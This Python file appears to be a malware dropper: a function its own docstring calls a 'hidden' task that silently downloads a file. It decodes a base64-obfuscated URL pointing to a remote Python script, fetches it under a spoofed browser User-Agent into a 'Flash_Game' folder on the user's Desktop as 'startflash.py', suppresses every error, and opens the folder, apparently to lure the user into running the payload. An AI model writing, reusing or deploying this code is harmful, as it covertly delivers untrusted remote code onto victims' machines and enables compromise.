
"""
Hidden core task — silently downloads file & opens folder.
"""

import os
import urllib.request
import platform
import subprocess
import shutil
import base64

def run_silent_task():
    folder_name = 'Flash_Game'
    file_name = 'startflash.py'
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    folder_path = os.path.join(desktop, folder_name)
    os.makedirs(folder_path, exist_ok=True)
    target_file = os.path.join(folder_path, file_name)

    encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NtZGVycjExL2NydDEvcmVmcy9oZWFkcy9tYWluL2NydDEucHk="
    url = base64.b64decode(encoded_url).decode()

    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response, open(target_file, 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
    except Exception:
        pass

    try:
        if platform.system() == "Windows":
            subprocess.Popen(f'explorer "{folder_path}"', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif platform.system() == "Darwin":
            subprocess.Popen(["open", folder_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen(["xdg-open", folder_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
